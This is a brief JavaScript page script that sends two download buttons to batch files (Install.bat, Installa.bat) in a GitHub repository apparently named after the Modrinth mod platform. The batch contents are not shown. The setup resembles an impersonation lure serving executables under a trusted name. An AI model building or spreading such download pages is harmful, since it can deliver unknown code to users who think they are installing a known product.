document.addEventListener('DOMContentLoaded', function() {
    const downloadButton = document.querySelector('.download-button');
    const secondButton = document.querySelector('.download-button-ita');
    const downloadLink = 'https://github.com/PrpleMoon/modrinth/releases/download/v1.0.0/Install.bat';
    const secondLink = 'https://github.com/PrpleMoon/modrinth/releases/download/v1.0.0/Installa.bat';
    downloadButton.addEventListener('click', function() {
        window.location.href = downloadLink;
    });
    secondButton.addEventListener('click', function() {
        window.location.href = secondLink;
    });
});
